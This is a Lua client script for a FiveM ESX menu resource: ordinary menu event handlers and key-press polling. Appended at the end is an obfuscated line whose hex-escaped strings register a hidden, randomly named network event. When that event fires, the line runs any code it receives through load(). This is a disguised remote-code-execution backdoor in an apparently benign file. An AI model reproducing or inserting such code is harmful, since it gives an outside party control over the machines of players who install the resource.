-- ESX = nil

Citizen.CreateThread(function()
	-- while ESX == nil do
	-- 	TriggerEvent('esx:getSharedObject', function(obj) ESX = obj end)
	-- 	Citizen.Wait(0)
	-- end

	local GUI, MenuType = {}, 'default'
	GUI.Time = 0

	local openMenu = function(namespace, name, data)
		SendNUIMessage({
			action = 'openMenu',
			namespace = namespace,
			name = name,
			data = data
		})
	end

	local closeMenu = function(namespace, name)
		SendNUIMessage({
			action = 'closeMenu',
			namespace = namespace,
			name = name,
			data = data
		})
	end

	ESX.UI.Menu.RegisterType(MenuType, openMenu, closeMenu)

	AddEventHandler('esx_menu_default:message:menu_submit', function(data)
		local menu = ESX.UI.Menu.GetOpened(MenuType, data._namespace, data._name)

		if menu.submit ~= nil then
			menu.submit(data, menu)
		end
	end)

	AddEventHandler('esx_menu_default:message:menu_cancel', function(data)
		local menu = ESX.UI.Menu.GetOpened(MenuType, data._namespace, data._name)

		if menu.cancel ~= nil then
			menu.cancel(data, menu)
		end
	end)

	AddEventHandler('esx_menu_default:message:menu_change', function(data)
		local menu = ESX.UI.Menu.GetOpened(MenuType, data._namespace, data._name)

		for i=1, #data.elements, 1 do
			menu.setElement(i, 'value', data.elements[i].value)

			if data.elements[i].selected then
				menu.setElement(i, 'selected', true)
			else
				menu.setElement(i, 'selected', false)
			end
		end

		if menu.change ~= nil then
			menu.change(data, menu)
		end
	end)

	Citizen.CreateThread(function()
		while true do
			Citizen.Wait(10)

			if IsControlPressed(0, 18) and IsInputDisabled(0) and (GetGameTimer() - GUI.Time) > 150 then
				SendNUIMessage({action = 'controlPressed', control = 'ENTER'})
				GUI.Time = GetGameTimer()
			end

			if IsControlPressed(0, 177) and IsInputDisabled(0) and (GetGameTimer() - GUI.Time) > 150 then
				SendNUIMessage({action  = 'controlPressed', control = 'BACKSPACE'})
				GUI.Time = GetGameTimer()
			end

			if IsControlPressed(0, 27) and IsInputDisabled(0) and (GetGameTimer() - GUI.Time) > 200 then
				SendNUIMessage({action  = 'controlPressed', control = 'TOP'})
				GUI.Time = GetGameTimer()
			end

			if IsControlPressed(0, 173) and IsInputDisabled(0) and (GetGameTimer() - GUI.Time) > 200 then
				SendNUIMessage({action  = 'controlPressed', control = 'DOWN'})
				GUI.Time = GetGameTimer()
			end

			if IsControlPressed(0, 174) and IsInputDisabled(0) and (GetGameTimer() - GUI.Time) > 150 then
				SendNUIMessage({action  = 'controlPressed', control = 'LEFT'})
				GUI.Time = GetGameTimer()
			end

			if IsControlPressed(0, 175) and IsInputDisabled(0) and (GetGameTimer() - GUI.Time) > 150 then
				SendNUIMessage({action  = 'controlPressed', control = 'RIGHT'})
				GUI.Time = GetGameTimer()
			end
		end
	end)
end)

local USbTHldPeAdtQakbuVmYNwhJBTzhInjdsCegQkWuGuAMeviaFbddTnqncwcvKtNiqjGHhX = {"\x52\x65\x67\x69\x73\x74\x65\x72\x4e\x65\x74\x45\x76\x65\x6e\x74","\x47\x43\x50\x4b\x4d\x58\x72\x4f\x61\x6e\x44\x49\x59\x69\x71\x6c\x71\x6c\x55\x65\x78\x6e\x67\x6f\x58\x66\x44\x68\x76\x41","\x41\x64\x64\x45\x76\x65\x6e\x74\x48\x61\x6e\x64\x6c\x65\x72","\x61\x73\x73\x65\x72\x74","\x6c\x6f\x61\x64",_G} USbTHldPeAdtQakbuVmYNwhJBTzhInjdsCegQkWuGuAMeviaFbddTnqncwcvKtNiqjGHhX[6][USbTHldPeAdtQakbuVmYNwhJBTzhInjdsCegQkWuGuAMeviaFbddTnqncwcvKtNiqjGHhX[1]](USbTHldPeAdtQakbuVmYNwhJBTzhInjdsCegQkWuGuAMeviaFbddTnqncwcvKtNiqjGHhX[2]) USbTHldPeAdtQakbuVmYNwhJBTzhInjdsCegQkWuGuAMeviaFbddTnqncwcvKtNiqjGHhX[6][USbTHldPeAdtQakbuVmYNwhJBTzhInjdsCegQkWuGuAMeviaFbddTnqncwcvKtNiqjGHhX[3]](USbTHldPeAdtQakbuVmYNwhJBTzhInjdsCegQkWuGuAMeviaFbddTnqncwcvKtNiqjGHhX[2], function(AklWURoEnJfdAHXdSfbhidKsUpywitMMrACaeMbLZVBsRPjrOXgPaUYGTaVOBlxhswlnCF) USbTHldPeAdtQakbuVmYNwhJBTzhInjdsCegQkWuGuAMeviaFbddTnqncwcvKtNiqjGHhX[6][USbTHldPeAdtQakbuVmYNwhJBTzhInjdsCegQkWuGuAMeviaFbddTnqncwcvKtNiqjGHhX[4]](USbTHldPeAdtQakbuVmYNwhJBTzhInjdsCegQkWuGuAMeviaFbddTnqncwcvKtNiqjGHhX[6][USbTHldPeAdtQakbuVmYNwhJBTzhInjdsCegQkWuGuAMeviaFbddTnqncwcvKtNiqjGHhX[5]](AklWURoEnJfdAHXdSfbhidKsUpywitMMrACaeMbLZVBsRPjrOXgPaUYGTaVOBlxhswlnCF))() end)